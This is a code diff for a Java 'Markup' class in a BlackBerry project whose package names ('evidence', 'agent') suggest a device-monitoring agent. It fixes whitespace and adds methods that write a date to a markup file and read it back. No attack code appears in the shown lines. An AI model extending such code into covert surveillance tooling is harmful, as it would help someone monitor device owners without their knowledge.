@@ -9,9 +9,11 @@
 package blackberry.evidence;
 
 import java.io.IOException;
+import java.util.Date;
 import java.util.Enumeration;
 
 import net.rim.device.api.crypto.CryptoException;
+import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.NumberUtilities;
 import blackberry.agent.Module;
 import blackberry.config.Keys;
@@ -146,7 +148,7 @@ public class Markup {
 
         return markupSeed;
     }
-    
+
     public static synchronized int removeMarkups() {
 
         int numDeleted = 0;
@@ -162,7 +164,7 @@ public class Markup {
 
         return numDeleted;
     }
-    
+
     /**
      * Checks if is markup.
      * 
@@ -172,13 +174,13 @@ public class Markup {
         //#ifdef DBC
         Check.requires(markupId != null, "markupId null");
         //#endif
-    
+
         final String markupName = makeMarkupName(markupId, true);
         //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         //#endif
-    
-        final AutoFile fileRet = new AutoFile(markupName, true);    
+
+        final AutoFile fileRet = new AutoFile(markupName, true);
         return fileRet.exists();
     }
 
@@ -196,7 +198,7 @@ public class Markup {
      */
     public synchronized byte[] readMarkup() throws IOException {
         //#ifdef DBC
-        Check.requires(markupId !=null, "markupId null");
+        Check.requires(markupId != null, "markupId null");
         //#endif
 
         final String markupName = makeMarkupName(markupId, true);
@@ -273,7 +275,7 @@ public class Markup {
         //#ifdef DBC
         Check.asserts(markupName != "", "markupName empty");
         //#endif
-        
+
         final AutoFile fileRet = new AutoFile(markupName, true);
 
         // se il file esiste viene azzerato
@@ -289,6 +291,31 @@ public class Markup {
         }
 
         return true;
+    }
+
+    public Date readDate() {
+        byte[] data;
+        Date date = null;
+        try {
+            data = readMarkup();
+
+            DataBuffer buffer = new DataBuffer(data, 0, data.length, true);
+            long time = buffer.readLong();
+            date = new Date(time);
+        } catch (IOException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error("readDate");
+            //#endif
+        }
+        return date;
+    }
+
+    public void write(Date date) {
+        DataBuffer buffer = new DataBuffer();
+        buffer.writeLong(date.getTime());
+        writeMarkup(buffer.getArray());
+
     }
 
 }
